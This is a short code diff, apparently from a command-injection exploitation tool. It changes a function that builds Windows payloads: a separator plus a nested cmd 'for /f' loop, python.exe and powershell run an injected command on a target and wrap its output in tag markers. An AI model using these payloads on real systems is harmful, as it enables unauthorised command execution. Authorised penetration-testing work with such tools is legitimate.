@@ -84,8 +84,10 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
       payload = (separator + " " + cmd + " "
                 )
     else:
-      payload = (separator + " " +
-                settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG +" $(" + cmd + ") "+ TAG + TAG + "')\""
+      payload = (separator + " "
+                      "for /f \"delims=\" %i in ('" + 
+                settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG +" $(" + cmd + ") "+ TAG + TAG + "')\"" +
+                "') do @set /p =%i <nul"
                 )
                                                                       
   else:
